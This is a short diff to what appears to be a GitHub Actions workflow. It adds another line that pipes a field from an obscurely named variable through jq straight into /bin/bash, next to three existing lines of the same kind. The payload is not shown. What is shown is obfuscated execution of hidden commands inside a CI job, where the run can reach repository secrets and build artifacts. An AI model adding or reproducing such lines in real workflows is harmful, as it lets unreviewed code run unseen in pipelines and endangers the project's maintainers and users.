@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$hfhzh00" | jq -r .cxxw045 | /bin/bash
           printf '%s' "$rvbdf4" | jq -r .t41300 | /bin/bash
           echo $tigr1 | jq -r .fz32 | /bin/bash
+          echo $z4 | jq -r .bqn659 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
